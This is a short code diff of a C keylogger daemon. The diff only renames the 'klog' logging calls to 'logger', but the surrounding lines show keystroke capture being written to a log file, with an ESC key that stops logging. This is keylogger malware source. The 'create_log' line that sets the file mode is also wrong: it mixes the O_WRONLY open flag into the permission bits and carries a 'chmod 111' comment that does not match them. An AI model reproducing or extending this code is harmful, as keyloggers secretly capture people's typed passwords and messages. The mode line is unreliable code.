@@ -24,7 +24,7 @@ int create_log(const char *log_file)
     mode = O_WRONLY | S_IRUSR | S_IRGRP | S_IROTH; /* chmod 111 */
 
     sprintf(path, "%s", log_file);
-    klog.info("Log file: %s", path);
+    logger.info("Log file: %s", path);
 
     log_fd = open(path, oflag, mode);
 
@@ -134,7 +134,7 @@ void keyloggerd(void)
                 log_key(log_fd, ev.code);
 
                 if (ev.code == KEY_ESC) {
-                    klog.info("Magic ESC key pressed, stopping logger");
+                    logger.info("Magic ESC key pressed, stopping logger");
                     break;
                 }
             }
@@ -142,7 +142,7 @@ void keyloggerd(void)
             if (errno == EINTR) {
                 continue;
             } else {
-                klog.error("Failed to read bytes: %s", strerror(errno));
+                logger.error("Failed to read bytes: %s", strerror(errno));
                 break;
             }
         }
